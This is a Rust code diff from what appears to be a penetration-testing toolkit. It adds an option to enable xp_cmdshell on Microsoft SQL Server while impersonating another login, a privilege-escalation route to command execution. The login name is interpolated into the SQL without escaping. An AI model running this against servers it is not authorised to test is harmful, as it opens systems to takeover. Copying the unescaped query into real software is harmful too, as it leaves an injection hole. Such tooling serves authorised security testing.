@@ -53,12 +53,18 @@ pub async fn mssql_command(args: &Value) -> Result<ToolOutput> {
 /// Enable xp_cmdshell on a MSSQL server.
 ///
 /// Required args: `target`, `username`
-/// Optional args: `password`, `domain`, `windows_auth`
+/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
 pub async fn mssql_enable_xp_cmdshell(args: &Value) -> Result<ToolOutput> {
-    let query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
-                 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+    let impersonate_user = optional_str(args, "impersonate_user");
+    let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
+                      EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
 
-    mssql_query(mssql_from_args(args)?, query).await
+    let query = match impersonate_user {
+        Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {base_query}"),
+        None => base_query.to_string(),
+    };
+
+    mssql_query(mssql_from_args(args)?, &query).await
 }
 
 /// Enumerate impersonation permissions on a MSSQL server.
